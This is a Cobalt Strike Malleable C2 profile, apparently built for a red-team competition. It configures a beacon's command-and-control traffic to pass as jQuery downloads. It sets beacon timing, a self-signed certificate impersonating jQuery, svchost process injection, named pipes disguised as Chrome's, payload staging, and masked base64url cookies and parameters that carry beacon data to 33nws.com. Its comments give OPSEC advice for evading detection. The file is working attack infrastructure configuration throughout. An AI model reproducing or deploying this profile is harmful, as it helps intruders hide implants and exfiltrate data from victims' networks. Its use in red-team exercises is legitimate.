# Malleable C2 Profile
# Version: CobaltStrike 3.11
# File: cobalt.profile
# Description: 
#    c2 profile attempting to mimic a jquery.js request
#    uses signed certificates (typically from Let's Encrypt)
#    or self-signed certificates
# Authors: @joevest, @andrewchiles, @001SPARTaN 

################################################
## Tips for Profile Parameter Values
################################################

## Parameter Values
## Enclose parameter in Double quote, not single
##      set useragent "SOME AGENT";   GOOD
##      set useragent 'SOME AGENT';   BAD

## Some special characters do not need escaping 
##      prepend "!@#$%^&*()";

## Semicolons are ok
##      prepend "This is an example;";

## Escape Double quotes
##      append "here is \"some\" stuff";

## Escape Backslashes 
##      append "more \\ stuff";

## HTTP Values
## Program .http-post.client must have a compiled size less than 252 bytes.

################################################
## Profile Name
################################################
## Description:
##    The name of this profile (used in the Indicators of Compromise report)
## Defaults:
##    sample_name: My Profile
## Guidelines:
##    - Choose a name that you want in a report
set sample_name "Cyber Weapon Competition profile";

################################################
## Sleep Times
################################################
## Description:
##    Timing between beacon check in
## Defaults:
##    sleeptime: 60000
##    jitter: 0
## Guidelines:
##    - Beacon Timing (1000 = 1 sec)
##    - Consider using odd jitter time so the time doesn't loop back on itself (not verified as a technique)
##    - 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67
set sleeptime "2000";        # 2 Seconds
#set sleeptime "60000";        # 1 Minute
#set sleeptime "300000";       # 5 Minutes
#set sleeptime "6000000";      # 10 Minutes
#set sleeptime "9000000";      # 15 Minutes
#set sleeptime "1200000";      # 20 Minutes
#set sleeptime "1800000";      # 30 Minutes
#set sleeptime "3600000";      # 1 Hours
set jitter    "11";            # % jitter

################################################
## User-Agent
################################################
## Description:
##    User-Agent string used in HTTP requests
## Defaults:
##    useragent: Internet Explorer (Random)
## Guidelines
##    - Use a User-Agent values that fits with your engagement
#set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)"; # IE 10
set useragent "33 NWS Rules"; # MS IE 11 User Agent

################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
    
    ## Option 1) Trusted and Signed Certificate
    ## Use keytool to create a Java Keystore file. 
    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
   
    ## Option 2) Create your own Self-Signed Certificate
    ## Use keytool to import your own self signed certificates

    #set keystore "/pathtokeystore";
    #set password "password";

    ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   "US";
    set CN  "jquery.com";
    set O   "jQuery";
    set OU  "Certificate Authority";
    set validity "365";
}

################################################
## SpawnTo Process
################################################
## Description:
##    Default x86/x64 program to open and inject shellcode into
## Defaults:
##    spawnto_x86: 	%windir%\syswow64\rundll32.exe
##    spawnto_x64: 	%windir%\sysnative\rundll32.exe
## Guidelines
##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
##      - sysnative for x64 and syswow64 for x86
##      - Example x64 : C:\WINDOWS\sysnative\w32tm.exe
##        Example x86 : C:\WINDOWS\syswow64\w32tm.exe
##    - The binary doesnt do anything wierd (protected binary, etc)
##    - !! Don't use these !! 
##    -   "csrss.exe","logoff.exe","rdpinit.exe","bootim.exe","smss.exe","userinit.exe","sppsvc.exe"
##    - A binary that executes without the UAC
##    - 64 bit for x64
##    - 32 bit for x86
set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";

################################################
## SMB beacons
################################################
## Description:
##    Peer-to-peer beacon using SMB for communication
## Defaults:
##    pipename: msagent_##
##    pipename_stager: status_##
## Guidelines:
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict!
##    - the ## is replaced with a number unique to a teamserver     
## ---------------------
#set pipename        "wkssvc_##";
#set pipename_stager "spoolss_##";
set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe

################################################
## DNS beacons
################################################
## Description:
##    Beacon that uses DNS for communication
## Defaults:
##    maxdns: 255
##    dns_idle: 0.0.0.0
##    dns_max_txt: 252
##    dns_sleep: 0
##    dns_stager_prepend: N/A
##    dns_stager_subhost: .stage.123456.
##    dns_ttl: 1
## Guidelines:
##    - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels
#set maxdns          "255";
#set dns_max_txt     "252";
#set dns_idle        "74.125.196.113"; #google.com (change this to match your campaign)
#set dns_sleep       "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
#set dns_stager_prepend ".resources.123456.";
#set dns_stager_subhost ".feeds.123456.";

################################################
## Staging process
################################################
## Description:
##    Malleable C2's http-stager block customizes the HTTP staging process
## Defaults:
##    uri_x86 Random String
##    uri_x64 Random String
##    HTTP Server Headers - Basic HTTP Headers
##    HTTP Client Headers - Basic HTTP Headers
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)

set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set

http-stager {  
    set uri_x86 "/data86";
    set uri_x64 "/data64";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Host" "33nws.com";
        header "Referer" "http://33nws.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}

################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
http-get {

    set uri "/data-get";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "33nws.com.com";
        header "Referer" "http://33nws.com.com/";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {   
            mask;
            base64url;
            print;
        }
    }
}

################################################
## HTTP POST
################################################
## Description:
##    POST is used to send output to the teamserver
##    Can use HTTP GET or POST to send data
##    Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel.
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Decide if you want to use HTTP GET or HTTP POST requests for this section
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
## Use HTTP POST for http-post section
## Uncomment this Section to activate
http-post {

    set uri "/data-post";
    set verb "POST";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "33nws.com";
        header "Referer" "http://33nws.com/";
        header "Accept-Encoding" "gzip, deflate";
       
        id {
            mask;       
            base64url;
            parameter "__cfduid";            
        }
              
        output {
            mask;
            base64url;
            print;
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask;
            base64url;
            print;
        }
    }
}